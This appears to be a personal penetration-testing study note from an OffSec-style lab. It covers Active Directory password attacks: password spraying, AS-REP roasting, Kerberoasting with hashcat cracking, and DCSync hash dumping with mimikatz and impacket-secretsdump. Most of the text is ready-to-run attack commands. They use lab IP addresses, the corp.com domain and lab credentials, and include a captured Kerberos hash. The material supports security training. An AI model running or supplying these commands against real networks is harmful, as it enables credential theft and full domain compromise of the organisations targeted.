
# Pass attacks

## Pass policy
```
net accounts
```

![[Pasted image 20240521124727.png]]

## Pass spray from windows

```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

![[Pasted image 20240521124816.png]]


## Pass spray with nxc, cme

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

![[Pasted image 20240521125223.png]]

![[Pasted image 20240521125553.png]]


## AS-REP

```
impacket-GetNPUsers -dc-ip 192.168.162.70 -request corp.com/pete:Nexus123!
```

![[Pasted image 20240521130528.png]]

```
sudo hashcat -m 18200 '$krb5asrep$23$dave@CORP.COM:be4f988f238e5d724399cc356d7a00e7$8d6ade2dbebbb094f576eb73abc07f8509c6972d6e11277489b0b99e77e961373b9726c917357203ae615c6c23f70e4542a4dd31e818db2725de8154d6fe7a3ccec93f08a866718c1ebec09ade6f16449f6ff29561c505248288513d8c2fed13094b3c6fc444db5c0d87187204f5bc7aba59ac2420077101b5e19507624447aab5a70e1fe2a1492f4802505f8c0a6366e8a53b759640f689c917074658eaff025d2995ed3cac9fe64220910d28b5bae57cd5d5f18a8e93ffe6ad66a1357c61244f3a425687c599c269f8fa7d61ba011a6f4386220e932199e054f5cb23546d730e04e628' ~/Desktop/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Offsec loves base64.rule**


```
.\Rubeus.exe asreproast /nowrap
```

![[Pasted image 20240521130633.png]]


## kerberoast - SPN

TGS-REP

```
impacket-GetUserSPNs -dc-ip 192.168.162.70 -request corp.com/jeff:'HenchmanPutridBonbon11'
```

![[Pasted image 20240521151025.png]]

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


## DCsync

DC are synced to reduce availability

These three permission needed to perform this attack:
1. Replicating Directory Changes
2. Replicating Directory Changes All
3. Replicating Directory Changes in Filtered Set

By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned

```
./mimikatz.exe

privilege::debug

lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
This will give only one hash

```
impacket-secretsdump corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.162.70
```

To dump all hash

![[Pasted image 20240521153201.png]]

